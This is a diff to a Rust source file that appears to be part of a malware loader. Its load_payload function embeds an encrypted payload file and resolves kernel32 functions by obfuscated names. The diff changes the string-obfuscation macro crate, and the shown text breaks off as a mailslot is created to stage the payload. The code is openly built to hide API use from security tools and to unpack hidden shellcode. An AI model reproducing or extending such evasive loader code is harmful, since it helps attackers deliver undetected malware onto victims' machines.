@@ -4,7 +4,7 @@ use std::time::Duration;
 use rand::Rng;
 use std::ptr;
 use crate::utils::{load_library, get_proc_address};
-use rustcrypt_ct_macros::obf_lit_bytes;
+use obfstr::obfbytes;
 
 pub fn load_payload() -> Result<Vec<u8>, String> {
     const ENCRYPT_DATA: &'static [u8] = include_bytes!("../../output/encrypt.bin");
@@ -16,7 +16,7 @@ pub fn load_payload() -> Result<Vec<u8>, String> {
     let mailslot_name_c = CString::new(mailslot_name_str.clone()).map_err(|e| e.to_string())?;
 
     unsafe {
-        let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
+        let kernel32 = load_library(obfbytes!(b"kernel32.dll\0").as_slice())?;
         
         // Define function types
         type CreateMailslotAFn = unsafe extern "system" fn(*const u8, u32, u32, *const c_void) -> isize;
@@ -27,12 +27,12 @@ pub fn load_payload() -> Result<Vec<u8>, String> {
         type CloseHandleFn = unsafe extern "system" fn(isize) -> i32;
 
         // Load functions
-        let create_mailslot_a: CreateMailslotAFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CreateMailslotA\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load CreateMailslotA\0").as_slice()).to_string())?);
-        let get_mailslot_info: GetMailslotInfoFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"GetMailslotInfo\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load GetMailslotInfo\0").as_slice()).to_string())?);
-        let create_file_a: CreateFileAFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CreateFileA\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load CreateFileA\0").as_slice()).to_string())?);
-        let write_file: WriteFileFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"WriteFile\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load WriteFile\0").as_slice()).to_string())?);
-        let read_file: ReadFileFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"ReadFile\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load ReadFile\0").as_slice()).to_string())?);
-        let close_handle: CloseHandleFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load CloseHandle\0").as_slice()).to_string())?);
+        let create_mailslot_a: CreateMailslotAFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"CreateMailslotA\0").as_slice()).map_err(|_| String::from_utf8_lossy(obfbytes!(b"Failed to load CreateMailslotA\0").as_slice()).to_string())?);
+        let get_mailslot_info: GetMailslotInfoFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"GetMailslotInfo\0").as_slice()).map_err(|_| String::from_utf8_lossy(obfbytes!(b"Failed to load GetMailslotInfo\0").as_slice()).to_string())?);
+        let create_file_a: CreateFileAFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"CreateFileA\0").as_slice()).map_err(|_| String::from_utf8_lossy(obfbytes!(b"Failed to load CreateFileA\0").as_slice()).to_string())?);
+        let write_file: WriteFileFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"WriteFile\0").as_slice()).map_err(|_| String::from_utf8_lossy(obfbytes!(b"Failed to load WriteFile\0").as_slice()).to_string())?);
+        let read_file: ReadFileFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"ReadFile\0").as_slice()).map_err(|_| String::from_utf8_lossy(obfbytes!(b"Failed to load ReadFile\0").as_slice()).to_string())?);
+        let close_handle: CloseHandleFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"CloseHandle\0").as_slice()).map_err(|_| String::from_utf8_lossy(obfbytes!(b"Failed to load CloseHandle\0").as_slice()).to_string())?);
 
         // 1. Create Mailslot (Server)
         let h_slot = create_mailslot_a(
